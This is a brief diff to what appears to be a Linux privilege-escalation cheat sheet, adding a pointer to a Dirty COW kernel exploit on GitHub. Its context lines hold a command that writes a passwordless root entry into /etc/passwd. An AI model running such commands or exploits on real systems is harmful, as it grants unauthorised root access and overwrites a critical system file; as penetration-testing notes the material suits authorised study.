@@ -48,3 +48,8 @@ https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.
 ```
 “root::0:0:root:/root:/bin/bash” > /etc/passwd
 ```
+
+## Try dirty cow exploit
+```
+https://github.com/FireFart/dirtycow/blob/master/dirty.c
+```
